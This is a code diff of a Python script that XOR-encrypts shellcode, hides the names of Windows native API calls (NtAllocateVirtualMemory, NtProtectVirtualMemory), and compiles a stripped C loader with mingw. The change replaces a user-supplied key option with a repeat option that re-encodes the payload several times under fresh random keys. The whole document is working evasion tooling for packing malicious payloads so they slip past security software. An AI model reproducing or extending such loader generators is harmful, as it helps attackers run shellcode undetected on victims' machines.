@@ -5,15 +5,16 @@ import random
 
 if len(sys.argv) < 3:
     script_name = os.path.basename(sys.argv[0])
-    print(f"Usage: {script_name} <shellcode.bin> <output.bin> [-k <key>] [-l <length>]")
+    print(f"Usage: {script_name} <shellcode.bin> <output.bin> [-l <key_length>] [-i <iterations>]")
     sys.exit(1)
 
 bin_file = sys.argv[1]
 output_bin = sys.argv[2]
 
-# Default key is a single random byte
-key = [random.randint(1, 255)]
+# Defaults
 key_length = 1
+iterations = 1
+iter_flag = False
 
 # Parse optional length (-l)
 if "-l" in sys.argv:
@@ -22,24 +23,14 @@ if "-l" in sys.argv:
     if key_length < 1 or key_length > 2:
         print("Error: key length must be 1 or 2")
         sys.exit(1)
-    key = [random.randint(1, 255) for _ in range(key_length)]
 
-# Parse optional key (-k)
-if "-k" in sys.argv:
-    k_index = sys.argv.index("-k")
-    k_value = sys.argv[k_index + 1]
-
-    if "," in k_value:
-        key = [int(b, 16) if b.startswith("0x") else int(b) for b in k_value.split(",")]
-    elif k_value.startswith("0x"):
-        hex_str = k_value[2:]
-        if len(hex_str) % 2 != 0:
-            hex_str = "0" + hex_str
-        key = [int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)]
-    else:
-        key = [int(k_value)]
-
-    key_length = len(key)
+# Parse optional iterations (-i)
+if "-i" in sys.argv:
+    i_index = sys.argv.index("-i")
+    iterations = int(sys.argv[i_index + 1])
+    if iterations < 1:
+        iterations = 1
+    iter_flag = True
 
 with open(bin_file, "rb") as f:
     shellcode = f.read()
@@ -54,27 +45,33 @@ def xor_c_string(s: str, key: list[int]) -> bytes:
 def bytes_to_c_array(b: bytes) -> str:
     return ",".join(f"0x{byte:02x}" for byte in b)
 
-# XOR shellcode
-xor_shellcode = xor_bytes(shellcode, key)
-shellcode_array = bytes_to_c_array(xor_shellcode)
-key_array = bytes_to_c_array(key)
+for it in range(iterations):
+    # Generate new random key every iteration
+    key = [random.randint(1, 255) for _ in range(key_length)]
 
-# Strings to encrypt
-c_strings = ["ntdll.dll", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"]
-xor_c_strings = [xor_c_string(s, key) for s in c_strings]
+    xor_shellcode = xor_bytes(shellcode, key)
+    shellcode_array = bytes_to_c_array(xor_shellcode)
+    key_array = bytes_to_c_array(key)
 
-# Compute offsets and stack buffer size
-offsets = []
-current_offset = 0
-for s in xor_c_strings:
-    offsets.append(current_offset)
-    current_offset += len(s)
-stackbuf_size = current_offset
+    # Strings to encrypt
+    c_strings = ["ntdll.dll", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"]
+    xor_c_strings = [xor_c_string(s, key) for s in c_strings]
 
-# Combined encrypted strings
-combined_array = bytes_to_c_array(b"".join(xor_c_strings))
+    # Compute offsets and stack buffer size
+    offsets = []
+    current_offset = 0
+    for s in xor_c_strings:
+        offsets.append(current_offset)
+        current_offset += len(s)
+    stackbuf_size = current_offset
 
-c_code = f'''#include "winapi_loader.h"
+    # Combined encrypted strings
+    combined_array = bytes_to_c_array(b"".join(xor_c_strings))
+
+    # Print the XOR key for this iteration
+    print(f"[+] Iteration {it+1} complete (XOR key: {key_array})")
+
+    c_code = f'''#include "winapi_loader.h"
 
 typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
     HANDLE ProcessHandle,
@@ -150,9 +147,8 @@ void _start() {{
 }}
 '''
 
-temp_exe = "temp_loader.exe"
-
 # Compile C code
+temp_exe = "temp_loader.exe"
 compile_cmd = [
     "x86_64-w64-mingw32-gcc",
     "-s", "-nostdlib", "-nostartfiles", "-ffreestanding",
@@ -181,6 +177,6 @@ os.remove(temp_exe)
 
 if proc.returncode != 0:
     print("objcopy failed:\n", proc.stderr.decode())
-else:
-    print(f"Shellcode generated: {output_bin} (XOR key: {key_array})")
+    sys.exit(1)
 
+print(f"Shellcode generated: {output_bin}")
